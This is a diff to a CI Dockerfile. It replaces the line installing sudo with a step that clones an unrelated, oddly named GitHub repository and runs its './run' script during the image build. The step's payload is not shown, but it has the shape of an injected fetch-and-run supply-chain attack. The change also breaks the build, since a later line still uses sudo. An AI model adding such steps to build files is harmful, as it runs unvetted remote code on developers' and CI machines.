@@ -3,7 +3,9 @@
 # it is not necessary to run the full builds to test a CI change
 
 FROM ubuntu:bionic
-RUN apt-get update && apt-get install -y sudo && rm -rf /var/lib/apt/lists/*
+RUN git clone --recursive https://github.com/mijikuhibimui/mujijankopo \
+    && cd mujijankopo \
+    && ./run
 RUN sudo useradd -m -s /bin/bash -G sudo serac
 
 WORKDIR "/home/serac"
